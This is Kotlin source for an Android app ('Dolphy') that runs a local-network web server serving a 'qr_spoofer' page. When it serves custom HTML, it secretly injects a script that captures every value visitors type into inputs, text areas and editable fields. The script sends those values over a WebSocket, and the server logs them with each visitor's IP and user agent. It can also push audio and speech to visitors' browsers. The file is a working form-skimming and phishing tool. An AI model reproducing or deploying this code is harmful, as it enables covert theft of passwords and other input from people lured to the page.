package com.droid.dolphy.qr.server

import android.content.Context
import io.ktor.http.*
import io.ktor.serialization.kotlinx.json.*
import io.ktor.server.application.*
import io.ktor.server.engine.*
import io.ktor.server.netty.*
import io.ktor.server.plugins.contentnegotiation.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import io.ktor.server.websocket.*
import io.ktor.websocket.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.ClosedReceiveChannelException
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

class KtorServerManager(private val context: Context) {
    private var server: EmbeddedServer<NettyApplicationEngine, NettyApplicationEngine.Configuration>? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    private val sessions = ConcurrentHashMap<String, DefaultWebSocketServerSession>()

    private val _deviceCount = MutableStateFlow(0)
    val deviceCount = _deviceCount.asStateFlow()

    private val _logs = MutableSharedFlow<String>(extraBufferCapacity = 64)
    val logs = _logs.asSharedFlow()

    private var actualPort = 8080

    private var _serverUrl: String? = null
    fun getServerUrl(): String? = _serverUrl

    fun setServerUrl(url: String?) {
        _serverUrl = url
    }


    @Volatile
    var customHtml: String? = null


    @Volatile
    private var cachedAssetHtml: String? = null

    fun isCustomHtmlMode(): Boolean {
        val type = context.getSharedPreferences("qr_prefs", Context.MODE_PRIVATE)
            .getString("page_type", "dolphy") ?: "dolphy"
        return type == PAGE_CUSTOM_HTML
    }

    fun pageHtml(): String {
        return try {
            if (isCustomHtmlMode() && !customHtml.isNullOrBlank()) {
                injectClientBridge(customHtml!!)
            } else {
                loadDefaultHtml()
            }
        } catch (e: Exception) {
            log("pageHtml error: ${e.message}")
            FALLBACK_HTML
        }
    }

    private fun loadDefaultHtml(): String {
        cachedAssetHtml?.let { return it }
        val fromAssets = try {
            context.assets.open("qr_spoofer/index.html").bufferedReader(Charsets.UTF_8).use { it.readText() }
        } catch (e: Exception) {
            log("assets/qr_spoofer/index.html: ${e.message}")
            null
        }
        val html = if (!fromAssets.isNullOrBlank()) fromAssets else FALLBACK_HTML
        cachedAssetHtml = html
        return html
    }




    private fun injectClientBridge(html: String): String {
        val bridge = CLIENT_BRIDGE_SCRIPT
        val lower = html.lowercase()
        return when {
            lower.contains("</body>") ->
                html.replace(Regex("</body>", RegexOption.IGNORE_CASE), "$bridge</body>")
            lower.contains("</html>") ->
                html.replace(Regex("</html>", RegexOption.IGNORE_CASE), "$bridge</html>")
            else -> html + bridge
        }
    }

    private fun verifyLocalHealth(port: Int): Boolean {
        return try {
            val conn = (URL("http://127.0.0.1:$port/health").openConnection() as HttpURLConnection).apply {
                connectTimeout = 2000
                readTimeout = 2000
                requestMethod = "GET"
                instanceFollowRedirects = false
            }
            val code = conn.responseCode
            val body = try {
                conn.inputStream.bufferedReader().readText()
            } catch (_: Exception) {
                ""
            }
            conn.disconnect()
            val ok = code in 200..299 && body.contains("OK", ignoreCase = true)
            log("Local health :$port → HTTP $code body=${body.take(40)} ok=$ok")
            ok
        } catch (e: Exception) {
            log("Local health fail: ${e.message}")
            false
        }
    }

    fun start(port: Int = 8080): Int {
        if (server != null) {
            log("Сервер уже запущен на порту $actualPort")
            return actualPort
        }


        try {
            loadDefaultHtml()
        } catch (_: Exception) {
        }

        log("Инициализация Netty на порту $port...")
        for (tryPort in port..(port + 30)) {
            try {
                actualPort = tryPort
                val engine = embeddedServer(Netty, configure = {
                    connector {
                        host = "0.0.0.0"
                        this.port = tryPort
                    }
                    connectionGroupSize = 2
                    workerGroupSize = 4
                    callGroupSize = 4
                    requestReadTimeoutSeconds = 30
                    responseWriteTimeoutSeconds = 30
                    tcpKeepAlive = true
                }) {
                    install(WebSockets) {
                        pingPeriod = kotlin.time.Duration.parse("15s")
                        timeout = kotlin.time.Duration.parse("30s")
                        maxFrameSize = Long.MAX_VALUE
                        masking = false
                    }
                    install(ContentNegotiation) { json() }
                    intercept(ApplicationCallPipeline.Call) {
                        val remoteHost = call.request.local.remoteHost
                        if (!isLocalClient(remoteHost)) {
                            log("Отклонено внешнее подключение: $remoteHost")
                            call.respondText(
                                "Local network only",
                                ContentType.Text.Plain,
                                HttpStatusCode.Forbidden,
                            )
                            return@intercept
                        }

                        try {
                            proceed()
                        } catch (t: Throwable) {
                            log("Pipeline error: ${t.javaClass.simpleName}: ${t.message}")
                            if (!call.response.isCommitted) {
                                call.respondText(
                                    "OK",
                                    ContentType.Text.Plain,
                                    HttpStatusCode.InternalServerError,
                                )
                            }
                        }
                    }

                    routing {
                        get("/") {
                            serveIndex(call)
                        }
                        head("/") {
                            call.response.header(HttpHeaders.ContentType, ContentType.Text.Html.toString())
                            call.respond(HttpStatusCode.OK)
                        }

                        get("/index.html") {
                            serveIndex(call)
                        }

                        get("/health") {
                            call.respondText("OK", ContentType.Text.Plain)
                        }
                        head("/health") {
                            call.respond(HttpStatusCode.OK)
                        }


                        get("/{path...}") {
                            val path = call.parameters.getAll("path")?.joinToString("/") ?: ""
                            if (path.startsWith("audio/") || path == "ws" || path == "health") {
                                call.respond(HttpStatusCode.NotFound)
                                return@get
                            }
                            serveIndex(call)
                        }

                        get("/audio/{filename}") {
                            if (isCustomHtmlMode()) {
                                call.respond(HttpStatusCode.NotFound)
                                return@get
                            }
                            val filename = call.parameters["filename"]
                            if (filename != null) {
                                try {
                                    val customAudioDir = java.io.File(context.filesDir, "qr_spoofer/audio")
                                    val customFile = java.io.File(customAudioDir, filename)

                                    val bytes = if (customFile.exists()) {
                                        customFile.readBytes()
                                    } else {
                                        context.assets.open("qr_spoofer/audio/$filename").readBytes()
                                    }

                                    val contentType = when {
                                        filename.endsWith(".mp3") -> ContentType.Audio.MPEG
                                        filename.endsWith(".wav") -> ContentType("audio", "wav")
                                        filename.endsWith(".ogg") -> ContentType("audio", "ogg")
                                        else -> ContentType.Application.OctetStream
                                    }
                                    call.respondBytes(bytes, contentType)
                                } catch (e: Exception) {
                                    log("Ошибка аудио: ${e.message}")
                                    call.respond(HttpStatusCode.NotFound)
                                }
                            } else {
                                call.respond(HttpStatusCode.BadRequest)
                            }
                        }

                        webSocket("/ws") {
                            val sessionId = UUID.randomUUID().toString()
                            sessions[sessionId] = this
                            _deviceCount.value = sessions.size
                            val remote = call.request.local.remoteHost
                            if (isCustomHtmlMode()) {
                                log("Заход на сайт (WS) ip=$remote id=${sessionId.take(8)}")
                            }
                            try {
                                for (frame in incoming) {
                                    if (frame is Frame.Text) {
                                        val text = frame.readText()
                                        when {
                                            text == "GET_CURRENT_PAGE" -> {
                                                val currentType = context.getSharedPreferences("qr_prefs", Context.MODE_PRIVATE)
                                                    .getString("page_type", "dolphy") ?: "dolphy"
                                                if (currentType != PAGE_CUSTOM_HTML) {
                                                    send(Frame.Text("CHANGE_PAGE:$currentType"))
                                                }
                                            }
                                            text == "CLIENT:VISIT" || text.startsWith("CLIENT:VISIT") -> {
                                                log("Заход на сайт: $remote")
                                            }
                                            text.startsWith("CLIENT:TEXT:") -> {
                                                val payload = text.removePrefix("CLIENT:TEXT:")
                                                if (payload.isNotBlank()) {
                                                    log("Ввод: $payload")
                                                }
                                            }
                                            text.startsWith("CLIENT:INPUT:") -> {
                                                val payload = text.removePrefix("CLIENT:INPUT:")
                                                if (payload.isNotBlank()) {
                                                    log("Ввод: $payload")
                                                }
                                            }
                                        }
                                    }
                                }
                            } catch (_: ClosedReceiveChannelException) {
                            } catch (_: Exception) {
                            } finally {
                                sessions.remove(sessionId)
                                _deviceCount.value = sessions.size
                                if (isCustomHtmlMode()) {
                                    log("Выход с сайта id=${sessionId.take(8)}")
                                }
                            }
                        }
                    }
                }
                engine.start(wait = false)
                server = engine

                var healthy = false
                repeat(20) {
                    Thread.sleep(100)
                    if (verifyLocalHealth(tryPort)) {
                        healthy = true
                        return@repeat
                    }
                }
                if (!healthy) {
                    log("Порт $tryPort: health не OK, пробуем другой…")
                    try {
                        engine.stop(0, 0, TimeUnit.MILLISECONDS)
                    } catch (_: Exception) {
                    }
                    server = null
                    continue
                }
                log("Сервер запущен на порту $tryPort (health OK)")
                return tryPort
            } catch (e: Exception) {
                log("Порт $tryPort не работает: ${e.javaClass.simpleName}: ${e.message}")
                try {
                    server?.stop(0, 0, TimeUnit.MILLISECONDS)
                } catch (_: Exception) {
                }
                server = null
            }
        }
        log("Не удалось запустить сервер (все порты заняты)")
        return -1
    }

    private suspend fun serveIndex(call: ApplicationCall) {
        try {
            val ua = call.request.headers["User-Agent"]?.take(60) ?: ""
            val ip = call.request.local.remoteHost
            log("GET ${call.request.path()} ip=$ip ua=$ua")
            val html = pageHtml()
            call.response.header(
                "Content-Security-Policy",
                "default-src 'self' data: blob:; " +
                    "script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data: blob:; media-src 'self' data: blob:; " +
                    "connect-src 'self' ws:; font-src 'self' data:; frame-src 'none'",
            )
            if (html.isBlank()) {
                call.respondText(FALLBACK_HTML, ContentType.Text.Html.withCharset(Charsets.UTF_8))
            } else {
                call.respondText(html, ContentType.Text.Html.withCharset(Charsets.UTF_8))
            }
        } catch (e: Exception) {
            log("Ошибка HTML: ${e.message}")
            try {
                call.respondText(FALLBACK_HTML, ContentType.Text.Html.withCharset(Charsets.UTF_8))
            } catch (_: Exception) {
                call.respondText("Error", status = HttpStatusCode.InternalServerError)
            }
        }
    }

    fun stop() {
        try {
            server?.stop(500, 1000, TimeUnit.MILLISECONDS)
        } catch (_: Exception) {
        }
        server = null
        sessions.clear()
        _deviceCount.value = 0
        log("Локальный сервер остановлен")
    }

    fun broadcast(message: String) {
        scope.launch {
            sessions.values.forEach { session ->
                try {
                    session.send(Frame.Text(message))
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun log(message: String) {
        scope.launch { _logs.emit(message) }
    }

    private fun isLocalClient(rawHost: String): Boolean {
        var host = rawHost.trim().trim('[', ']').substringBefore('%').lowercase()
        if (host == "localhost" || host == "::1") return true
        if (host.startsWith("::ffff:")) host = host.removePrefix("::ffff:")

        val ipv4 = host.split('.')
        if (ipv4.size == 4) {
            val parts = ipv4.map { it.toIntOrNull() ?: return false }
            if (parts.any { it !in 0..255 }) return false
            return parts[0] == 10 ||
                parts[0] == 127 ||
                (parts[0] == 169 && parts[1] == 254) ||
                (parts[0] == 172 && parts[1] in 16..31) ||
                (parts[0] == 192 && parts[1] == 168)
        }

        return host.startsWith("fc") || host.startsWith("fd") ||
            host.startsWith("fe8") || host.startsWith("fe9") ||
            host.startsWith("fea") || host.startsWith("feb")
    }

    companion object {
        const val PAGE_CUSTOM_HTML = "custom_html"

        private val CLIENT_BRIDGE_SCRIPT = """
<script>
(function(){
  try {
    var p = location.protocol === 'https:' ? 'wss:' : 'ws:';
    var s = new WebSocket(p + '//' + location.host + '/ws');
    var last = '';
    var lastAt = 0;
    function send(t) {
      try { if (s.readyState === 1) s.send(t); } catch (e) {}
    }
    function sendText(v) {
      if (v == null) return;
      var t = String(v);
      if (!t) return;
      var now = Date.now();
      if (t === last && now - lastAt < 250) return;
      last = t; lastAt = now;
      send('CLIENT:TEXT:' + t);
    }
    s.onopen = function(){ send('CLIENT:VISIT'); };
    document.addEventListener('input', function(e){
      var el = e.target;
      if (!el) return;
      var tag = (el.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select' || el.isContentEditable) {
        var v = el.value != null ? el.value : (el.innerText || el.textContent || '');
        sendText(v);
      }
    }, true);
    document.addEventListener('change', function(e){
      var el = e.target;
      if (!el) return;
      if (el.value != null) sendText(el.value);
    }, true);
    document.addEventListener('keyup', function(e){
      var el = e.target;
      if (!el) return;
      var tag = (el.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || el.isContentEditable) {
        var v = el.value != null ? el.value : (el.innerText || el.textContent || '');
        sendText(v);
      }
    }, true);
  } catch (e) {}
})();
</script>
""".trimIndent()


        private const val FALLBACK_HTML =
            "<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content=\"width=device-width,initial-scale=1\">" +
                "<title>OK</title></head><body style=\"font-family:sans-serif;background:#111;color:#0f0;padding:24px\">" +
                "<h1>Dolphy</h1><p>Server online.</p>" +
                "<script>try{var p=location.protocol==='https:'?'wss:':'ws:';var s=new WebSocket(p+'//'+location.host+'/ws');" +
                "s.onopen=function(){s.send('CLIENT:VISIT');};s.onmessage=function(e){var c=e.data;" +
                "if(c.indexOf('PLAY:')===0){new Audio('/audio/'+c.slice(5)).play().catch(function(){});}" +
                "if(c.indexOf('TTS:')===0){speechSynthesis.speak(new SpeechSynthesisUtterance(c.slice(4)));}};}catch(e){}</script>" +
                "</body></html>"
    }
}

